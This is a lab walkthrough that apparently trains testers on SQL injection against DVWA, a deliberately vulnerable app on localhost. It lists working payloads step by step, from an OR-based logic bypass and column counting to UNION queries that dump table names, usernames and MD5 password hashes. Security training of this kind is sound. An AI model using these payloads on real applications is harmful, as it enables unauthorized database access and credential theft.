🔓 SQL Injection – DVWA (Step-by-Step)
🎯 Objective
Exploit SQL Injection in DVWA to:
    1. Bypass logic
    2. Extract database data
    3. Prove impact
    4. (Later) automate with sqlmap

🧱 STEP 0: Pre-Checks (DO THIS ONCE)
1️⃣ Login to DVWA
http://localhost/DVWA/login.php
Username: admin
Password: password

2️⃣ Set Security Level → LOW
    • DVWA → Security
    • Set Low
    • Click Submit
✅ SQLi is now intentionally vulnerable

🧪 STEP 1: Locate the SQL Injection Point
Go to:
DVWA → Vulnerabilities → SQL Injection
You’ll see:
    • An input box: User ID
    • A Submit button
This input is directly used in a SQL query like:
SELECT first_name, last_name FROM users WHERE user_id = '$id';

💥 STEP 2: Basic SQL Injection Test
🔹 Payload 1 – Test for SQLi
Enter:
1'
Click Submit
✅ Expected Result
You should see:
    • SQL error
    • Or broken query behavior
🎯 This confirms SQL Injection exists
[screenshots/sql-injection/payload1.png]

🔓 STEP 3: Authentication / Logic Bypass
🔹 Payload 2 – Always True Condition
Enter:
1' OR '1'='1

✅ Result
    • Multiple users returned
    • Not just user ID 1
📌 Impact: Attacker can bypass intended logic
[screenshots/sql-injection/payload2.png]

🧠 Why This Works
WHERE user_id = '1' OR '1'='1'
Since '1'='1' is always true → database returns all rows

🧨 STEP 4: Identify Number of Columns (CRITICAL)
We need this for UNION attacks.
🔹 Payload 3 – ORDER BY
Try one by one:
1' ORDER BY 1-- -

[screenshots/sql-injection/payload31.png]

1' ORDER BY 2-- -

[screenshots/sql-injection/payload32.png]



1' ORDER BY 3-- -
[screenshots/sql-injection/payload33.png]
❌ When it breaks → too many columns
✅ DVWA Result
Usually:
    • ORDER BY 2 → works
    • ORDER BY 3 → error
👉 Number of columns = 2

🧬 STEP 5: UNION-Based SQL Injection (DATA EXTRACTION)
🔹 Payload 4 – UNION Test
1' UNION SELECT 1,2-- -
✅ Expected Output

You should see:
First name: 1
Surname: 2
🎯 This confirms:
    • UNION injection works
    • You control output columns
[screenshots/sql-injection/payload4.png]
🗃️ STEP 6: Extract Database Name
🔹 Payload 5
1' UNION SELECT database(),user()-- -
✅ Output Example

dvwa@localhost

📌 Impact: DB fingerprinting
[screenshots/sql-injection/payload5.png]
📂 STEP 7: Extract Table Names
🔹 Payload 6
1' UNION SELECT table_name, null 
FROM information_schema.tables 
WHERE table_schema='dvwa'-- -
✅ Expected Tables

users
guestbook
[screenshots/sql-injection/payload6.png]

🔑 STEP 8: Extract Column Names (users table)
🔹 Payload 7
1' UNION SELECT column_name, null 
FROM information_schema.columns 
WHERE table_name='users'-- -
✅ Columns

user
password
first_name
last_name
[screenshots/sql-injection/payload7.png]

🔐 STEP 9: Dump Usernames & Password Hashes
🔹 Payload 8 (IMPORTANT)
1' UNION SELECT user, password FROM users-- -
✅ Output
You’ll see:
    • Usernames
    • MD5 password hashes

Example:
admin | 5f4dcc3b5aa765d61d8327deb882cf99
👉 That hash = password
[screenshots/sql-injection/payload7.png]

🎯 IMPACT SUMMARY 
🔴 Vulnerability
SQL Injection (OWASP A03)
🔴 Impact
    • Unauthorized data access
    • Credential disclosure
    • Full database compromise
🔴 Risk
Critical